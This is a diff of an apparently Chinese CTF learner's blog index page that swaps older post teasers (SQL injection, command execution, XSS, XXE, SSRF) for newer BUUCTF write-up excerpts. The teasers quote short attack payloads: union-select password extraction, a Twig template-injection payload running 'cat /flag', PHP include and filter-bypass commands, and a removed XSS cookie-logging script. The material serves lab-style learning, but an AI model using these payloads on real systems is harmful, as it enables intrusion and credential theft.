@@ -204,7 +204,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">38</div>
+    <div class="sidebar-state-number">62</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -212,7 +212,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">18</div>
+    <div class="sidebar-state-number">35</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -272,35 +272,25 @@
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/09/CTFSHOW-sql/" aria-label="CTFSHOW-sql"></a>
+      <a class="post-link" href="/2025/03/27/%5BBJDCTF2020%5DCookie%20is%20so%20stable/" aria-label="[BJDCTF2020]Cookie is so stable"></a>
     
     
     <div class="post-cover-left">
       
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW-sql" class="lazyload">
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[BJDCTF2020]Cookie is so stable" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-09</span>
-        <span><span class="icon-pencil"></span>2k 字</span>
-        <span><span class="icon-clock"></span>10 分钟</span>
+        <span><span class="icon-calendar"></span>2025-03-27</span>
+        <span><span class="icon-pencil"></span>343 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
       </div>
-      <h2 class="post-title">CTFSHOW-sql</h2>
+      <h2 class="post-title">[BJDCTF2020]Cookie is so stable</h2>
       <article class="post-article">
         
-           无过滤(输入无过滤，返回有过滤)
- web171
-万能密码
-联合注入
- web172
-无过滤联合注入
-0&#39; union select 1,(select password from ctfshow_user2 where username=&#39;flag&#39;) %23
- web173
-用hex()绕过正则
-11&amp;#x27; union select id,hex(username),hex(password) from ctfshow_user3--+
- web174(过滤数字、flag)
-123456//拼接sql语句查找指定ID用户$sql = &amp;quot;select id,username
+           知识点：
+12345678910111213141516171819twig模板注入判断：输入&amp;#123;&amp;#123;7*&amp;#x27;7&amp;#x27;&amp;#125;&amp;#125;返回49则是twig返回7777777则是jinja2twig模板注入payload:&amp;#123;&amp;#123;_self.env.registerUndefinedFilterCallback(&amp;quot;exec&amp;quot;)&amp;#125;&amp;#125;&amp;#123;&amp;#123;_self.env.getFilter(&amp;quot;cat /flag&amp;quot;)&amp;#125;&amp;#125;&amp;#123;&amp;#123;&amp;#x27;/et
         
       </article>
     </div>
@@ -310,27 +300,35 @@
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/04/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" aria-label="命令执行绕过姿势"></a>
+      <a class="post-link" href="/2025/03/27/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/" aria-label="[WUSTCTF2020]朴实无华"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="命令执行绕过姿势" class="lazyload">
+        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="[WUSTCTF2020]朴实无华" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-04</span>
-        <span><span class="icon-pencil"></span>3.7k 字</span>
-        <span><span class="icon-clock"></span>16 分钟</span>
+        <span><span class="icon-calendar"></span>2025-03-27</span>
+        <span><span class="icon-pencil"></span>660 字</span>
+        <span><span class="icon-clock"></span>2 分钟</span>
       </div>
-      <h2 class="post-title">命令执行绕过姿势</h2>
+      <h2 class="post-title">[WUSTCTF2020]朴实无华</h2>
       <article class="post-article">
         
-           小知识
-12345include不用括号，分号可以用?&amp;gt;代替。 //c=include$_GET[1]?&amp;gt;&amp;amp;1=data://text/plain,&amp;lt;?php system(&amp;quot;cat flag.php&amp;quot;);?&amp;gt;若想截断后面语句：%0a、%26、||&amp;lt;、&amp;lt;&amp;gt;、$&amp;#123;IFS&amp;#125;可以绕过空格过滤
- 无过滤：
-12345678910111213141516171819通配符payload1:c=system(&amp;quot;nl fla?????&amp;quot;);payload2:c=system(&amp;quot;nl fl
+           知识点:
+12345intval()输入100e2之类的数据，会解释称100，但后面在执行+1时，100e2是解释称10000的，因此使用100e2绕过0e215962017的md5值弱等于0e215962017$IFS$1代替空格
+一进去什么都没发现
+用dirsearch扫一下
+发现robots.txt
+访问之后发现/fAke_f1agggg.php
+访问发现什么都没有
+不信邪
+抓个包看看
+在响应头看到了fl4g.php
+访问
+1234567891011121314151617181920212223242526272829303132333435363738394041&amp;lt;?phph
         
       </article>
     </div>
@@ -340,28 +338,179 @@
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/02/28/php%E5%8E%9F%E7%94%9F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%B1%BB/" aria-label="php原生文件操作类"></a>
+      <a class="post-link" href="/2025/03/26/%5BBJDCTF2020%5DMark%20loves%20cat/" aria-label="[BJDCTF2020]Mark loves cat"></a>
     
     
     <div class="post-cover-left">
       
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="php原生文件操作类" class="lazyload">
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[BJDCTF2020]Mark loves cat" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-28</span>
-        <span><span class="icon-pencil"></span>823 字</span>
+        <span><span class="icon-calendar"></span>2025-03-26</span>
+        <span><span class="icon-pencil"></span>290 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
+      </div>
+      <h2 class="post-title">[BJDCTF2020]Mark loves cat</h2>
+      <article class="post-article">
+        
+          进来之后毫无头绪
+
+我们用dirsearch扫一下
+发现有.git文件
+那我们再用Githack扫一下
+
+扫出了index.php源码
+哈哈哈哈
+
+1234567891011121314151617181920212223242526272829303132&amp;lt;?phpinclude &amp;#x27;flag.php&amp;#x27;;$yds = &amp;quot;dog&amp;quot;;$is = &amp;quot;cat&amp;quot;;$handsome = &amp;#x27;yds&amp;#x27;;foreach($_POST as $x =&amp;gt; $y)&amp;#123;　　　　    $$x = $y  ;  //传a
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/26/%5BGWCTF%202019%5D%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/" aria-label="[GWCTF 2019]我有一个数据库"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="../images/17373827994914.jpg" data-sizes="auto" alt="[GWCTF 2019]我有一个数据库" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-26</span>
+        <span><span class="icon-pencil"></span>209 字</span>
+        <span><span class="icon-clock"></span>1 分钟</span>
+      </div>
+      <h2 class="post-title">[GWCTF 2019]我有一个数据库</h2>
+      <article class="post-article">
+        
+          考点：
+1.目录扫描
+2.[phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）](https://www.abelche.com/2019/11/16/CVE/phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）/)
+题目：
+
+这题实在没思路
+根据题解说
+现用扫描目录工具扫一下
+
+发现有三个文件
+打开robots.txt
+
+打开phpinfo.php
+
+也没什么用
+继续访问phpmyadmin/
+
+题解说看phpmyadmin版本
+
+查询到4.8.1版本存在任意文件读取漏洞：[phpmyadmin 4.8.1 远程文件包含漏洞（CV
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/26/%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/" aria-label="[GXYCTF2019]禁止套娃"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[GXYCTF2019]禁止套娃" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-26</span>
+        <span><span class="icon-pencil"></span>681 字</span>
+        <span><span class="icon-clock"></span>2 分钟</span>
+      </div>
+      <h2 class="post-title">[GXYCTF2019]禁止套娃</h2>
+      <article class="post-article">
+        
+          考察知识点：
+12git泄露无can
+
+进入题目
+搜查源码，抓包，或者用dirsearch搜都没有发现任何东西
+我们用GitHack查看一下是不是源码泄露
+1python GitHack.py http://4bb4b91d-be9c-4a85-943f-3e68a9e33e62.node5.buuoj.cn:81/.git
+发现了一个index.php
+打开一看
+代码审计…
+
+1234567891011121314151617181920212223242526272829&amp;lt;?phpinclude &amp;quot;flag.php&amp;quot;; echo &amp;quot;flag在哪里呢?&amp;l
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/25/%5BBUUCTF%202018%5DOnline%20Tool/" aria-label="[BUUCTF 2018]Online Tool"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="../images/1737907114de8a.jpg" data-sizes="auto" alt="[BUUCTF 2018]Online Tool" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-25</span>
+        <span><span class="icon-pencil"></span>599 字</span>
+        <span><span class="icon-clock"></span>2 分钟</span>
+      </div>
+      <h2 class="post-title">[BUUCTF 2018]Online Tool</h2>
+      <article class="post-article">
+        
+          又是代码审计
+123456789101112131415161718&amp;lt;?phpif (isset($_SERVER[&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;])) &amp;#123;    $_SERVER[&amp;#x27;REMOTE_ADDR&amp;#x27;] = $_SERVER[&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;];&amp;#125;if(!isset($_GET[&amp;#x27;host&amp;#x27;])) &amp;#123;    highlight_file(__FILE__);&amp;#125; else &amp;#123;    $host = $_GET[&amp;
+        
+      </article>
+    </div>
+  </div>
+</div>
+  
+    <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/25/%5BBJDCTF2020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/" aria-label="[BJDCTF2020]ZJCTF，不过如此"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[BJDCTF2020]ZJCTF，不过如此" class="lazyload">
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-25</span>
+        <span><span class="icon-pencil"></span>797 字</span>
         <span><span class="icon-clock"></span>3 分钟</span>
       </div>
-      <h2 class="post-title">php原生文件操作类</h2>
+      <h2 class="post-title">[BJDCTF2020]ZJCTF，不过如此</h2>
       <article class="post-article">
         
-          我在做一个ctf新手题的时候遇到了此概念
-这类概念在反序列化中用到相对多一点
- 例题
-先看这题源码
-1234567891011121314&amp;lt;?phphighlight_file(&amp;#x27;index.php&amp;#x27;);# 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~error_reporting(0);$J1ng = $_POST[&amp;#x27;J&amp;#x27;];$Hong = $_POST[&amp;#x27;H&amp;#x27;];$Keng = $_GET[&amp;#x27;K&amp;#x27;];$Wang = $_GET[&amp;#x27;W&amp;#x27;];$dir = new $Ke
+          题目源码：
+1234567891011121314151617&amp;lt;?phperror_reporting(0);$text = $_GET[&amp;quot;text&amp;quot;];$file = $_GET[&amp;quot;file&amp;quot;];if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,&amp;#x27;r&amp;#x27;)===&amp;quot;I have a dream&amp;quot;))&amp;#123;    echo &amp;quot;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;quot;.file_get_contents($text,&amp;#x27;r&amp;#x2
         
       </article>
     </div>
@@ -371,99 +520,39 @@
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/02/24/php%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7/" aria-label="php常用特性"></a>
+      <a class="post-link" href="/2025/03/25/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5Dphpweb/" aria-label="[网鼎杯 2020 朱雀组]phpweb"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="php常用特性" class="lazyload">
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[网鼎杯 2020 朱雀组]phpweb" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-24</span>
-        <span><span class="icon-pencil"></span>8.3k 字</span>
-        <span><span class="icon-clock"></span>38 分钟</span>
-      </div>
-      <h2 class="post-title">php常用特性</h2>
-      <article class="post-article">
-        
-           常见php函数
-12345678910substr(string,start,length)  //截取字符串strrev(string $string) //反转字符串FilesystemIterator   //获取目录文件FilesystemIteratortrim()         //用于去除字符串两端的空白字符或其他指定字符。getcwd()函数    //取得当前工作目录getcwd()函数strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）stripos() -查找字符串在另一字符串中第一次出现的位置（不区分大小写）strrpos() - 查找字符串
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/02/23/%E7%88%86%E7%A0%B4/" aria-label="爆破"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/126839103p0master1200.jpg" data-sizes="auto" alt="爆破" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-23</span>
-        <span><span class="icon-pencil"></span>531 字</span>
+        <span><span class="icon-calendar"></span>2025-03-25</span>
+        <span><span class="icon-pencil"></span>573 字</span>
         <span><span class="icon-clock"></span>2 分钟</span>
       </div>
-      <h2 class="post-title">爆破</h2>
+      <h2 class="post-title">[网鼎杯 2020 朱雀组]phpweb</h2>
       <article class="post-article">
         
-           php伪随机数
- 原理
-https://blog.csdn.net/qq_35493457/article/details/124080444
-123mt_srand() //播种 Mersenne Twister 随机数生成器。 mt_rand()   //生成随机数简单来说mt_srand()通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数
-漏洞之处：
-mt_rand()如何生成的随机整数，它与设置的seed值和调用该函数的次数有关，假设使用mt_srand(12345)进行了一次播种，那么第一次调用mt_rand生成的数值为a，第二次为b，第三次为c。所以当有人拿到
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/02/22/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" aria-label="信息搜集"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="信息搜集" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-22</span>
-        <span><span class="icon-pencil"></span>1.2k 字</span>
-        <span><span class="icon-clock"></span>4 分钟</span>
-      </div>
-      <h2 class="post-title">信息搜集</h2>
-      <article class="post-article">
-        
-           WEB-1-2-查看源码
-f12
-ctrl+u
-url前加vier-source:
-crtl+shift+i
-另辟蹊径：
-一直刷新网页同时一直按f12，以条件竞争打开源码
-在还没创建好环境之前打开源代码
-浏览器关闭js
-Ctrl+s 保存页面至电脑任意位置后用文本打开即可
- WEB-4-5-6-7-8-信息源码泄露
-一般都是根据环境的不同，一些备份文件未删除导致的代码信息泄露
-最简单的方法就是用dirsearch工具扫一下
-【web审计-源码泄露】获取源码方法，利用工具_dsstoreexp-CSDN博客]:
- WEB-9-vim缓存泄露
-在linux中用vi或vim编辑文件时会创建临时文件
+          进入题目页面后
+没发现任何东西
+但我们查看源码，发现有两个隐藏的输入框，都是用post传参的
+一个是p一个是func
+我们打开hackbar
+
+发现这两个已经传参了
+我们根据func的名字，推测func是函数，p为func的参数
+我们来实验一下
+
+果然被回显了
+那我们就可以用它尝试着去读取文件或命令执行了
+system等命令执行函数都被过滤了
+试了一下，好像只有highlight_file和file_get_contents能用
+我们用file_get_contents查看index.php的源码
+123456789101112131415161718192021222324252627282
         
       </article>
     </div>
@@ -473,91 +562,39 @@ Ctrl+s 保存页面至电脑任意位置后用文本打开即可
     <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/02/19/CTFSHOW-XSS/" aria-label="CTFSHOW-XSS"></a>
+      <a class="post-link" href="/2025/03/24/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook/" aria-label="[网鼎杯 2018]Fakebook"></a>
     
     
     <div class="post-cover-left">
       
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW-XSS" class="lazyload">
+        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="[网鼎杯 2018]Fakebook" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-19</span>
-        <span><span class="icon-pencil"></span>2.1k 字</span>
-        <span><span class="icon-clock"></span>8 分钟</span>
-      </div>
-      <h2 class="post-title">CTFSHOW-XSS</h2>
-      <article class="post-article">
-        
-           反射型xss
- WEB316(无过滤)
-在服务器上放一个接受cookie的文件xss.php
-1234567&amp;lt;?php	$cookie = $_GET[&amp;#x27;cookie&amp;#x27;];	$time = date(&amp;#x27;Y-m-d h:i:s&amp;#x27;, time());	$log = fopen(&amp;quot;cookie.txt&amp;quot;, &amp;quot;a&amp;quot;);	fwrite($log,$time.&amp;#x27;:    &amp;#x27;. $cookie . &amp;quot;\n&amp;quot;);	fclose($log);?&amp;gt;
-payload:
-1&amp;lt;sc
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/02/18/CTFSHOW-XXE/" aria-label="CTFSHOW-XXE"></a>
-    
-    
-    <div class="post-cover-right">
-      
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW-XXE" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-18</span>
-        <span><span class="icon-pencil"></span>513 字</span>
+        <span><span class="icon-calendar"></span>2025-03-24</span>
+        <span><span class="icon-pencil"></span>518 字</span>
         <span><span class="icon-clock"></span>2 分钟</span>
       </div>
-      <h2 class="post-title">CTFSHOW-XXE</h2>
+      <h2 class="post-title">[网鼎杯 2018]Fakebook</h2>
       <article class="post-article">
         
-           WEB-373(有回显xxe)
-1234567891011error_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&amp;#x27;php://input&amp;#x27;);if(isset($xmlfile))&amp;#123;    $dom = new DOMDocument();    $dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $
-        
-      </article>
-    </div>
-  </div>
-</div>
-  
-    <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/02/17/Csrf/" aria-label="Csrf"></a>
-    
-    
-    <div class="post-cover-left">
-      
-        <img data-src="/../images/126839103p0master1200.jpg" data-sizes="auto" alt="Csrf" class="lazyload">
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-17</span>
-        <span><span class="icon-pencil"></span>1.5k 字</span>
-        <span><span class="icon-clock"></span>5 分钟</span>
-      </div>
-      <h2 class="post-title">Csrf</h2>
-      <article class="post-article">
-        
-           XSS与csrf对比
-xss：攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击
-csrf：攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击
-XSS容易发现，因为攻击者需要登陆后台完成攻击，管理员可以看到日志发现攻击者；而CSRF的攻击是管理员自己实现的，攻击者只负责构造代码。
-CSRF属于业务逻辑漏洞，服务器信任经过身份认证的用户
-XSS属于技术漏洞，客户信任服务器
- Csrf(跨站请求伪造)攻击思想
-攻击者诱使在一个网站上已经登录的用户在另一个网站上执行未授权的操作（例如，转账、修改个
+          
+这个题我看到有登录和注册还以为是sql注入，但发现根本注不了
+那就先登录进去看看吧
+
+进来之后发现no可以注入
+1230 union/**/select 1,(查询语句),3,4#//union select连在一起会被过滤，用/**/分开//查询结果只能在2处回显
+但经过我一顿查询
+发现毛都没有
+注意看，这里的data字段存放的是序列化字符串(后面要考)
+
+根据题解思路，说看robots.txt
+我们访问一下
+
+发现一个备份文件，我们下载下来访问
+发现一堆代码
+12345678910111213141516171819202122232425262728293031323334353637
         
       </article>
     </div>
@@ -567,25 +604,25 @@ XSS属于技术漏洞，客户信任服务器
     <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/02/16/CTFSHOW%E4%B9%8BSSRF/" aria-label="CTFSHOW之SSRF"></a>
+      <a class="post-link" href="/2025/03/23/CTFSHOW-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" aria-label="CTFSHOW-php反序列化"></a>
     
     
     <div class="post-cover-right">
       
-        <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="CTFSHOW之SSRF" class="lazyload">
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="CTFSHOW-php反序列化" class="lazyload">
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-16</span>
-        <span><span class="icon-pencil"></span>1.7k 字</span>
-        <span><span class="icon-clock"></span>7 分钟</span>
+        <span><span class="icon-calendar"></span>2025-03-23</span>
+        <span><span class="icon-pencil"></span>2.6k 字</span>
+        <span><span class="icon-clock"></span>14 分钟</span>
       </div>
-      <h2 class="post-title">CTFSHOW之SSRF</h2>
+      <h2 class="post-title">CTFSHOW-php反序列化</h2>
       <article class="post-article">
         
-           web入门351(无过滤)
-1234567891011&amp;lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&amp;#x27;url&amp;#x27;];$ch=curl_init($url);//初始化 cURL 会话curl_setopt($ch, CURLOPT_HEADER, 0);//启用时会将头文件的信息作为数据流输出。curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。$result=curl_exec($c
+           web254(代码审计)
+123456789101112131415161718192021222324252627282930313233343536373839include(&amp;#x27;flag.php&amp;#x27;);class ctfShowUser&amp;#123;    public $username=&amp;#x27;xxxxxx&amp;#x27;;    public $password=&amp;#x27;xxxxxx&amp;#x27;;    public $isVip=false;    public function checkVip()&amp;#123;        return $this-&amp;gt
         
       </article>
     </div>
@@ -596,7 +633,7 @@ XSS属于技术漏洞，客户信任服务器
 
   <nav id="page-nav" data-aos="fade-up">
     
-    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
   </nav>
 
 
@@ -625,10 +662,10 @@ XSS属于技术漏洞，客户信任服务器
     
       <div>
         <span class="icon-brush"></span>
-        62.9k
+        91.7k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        04:11
+        06:19
       </div>
     
     
@@ -664,7 +701,7 @@ XSS属于技术漏洞，客户信任服务器
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">38</div>
+    <div class="sidebar-state-number">62</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -672,7 +709,7 @@ XSS属于技术漏洞，客户信任服务器
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">18</div>
+    <div class="sidebar-state-number">35</div>
   </div>
 </div>
 <div class="sidebar-social">
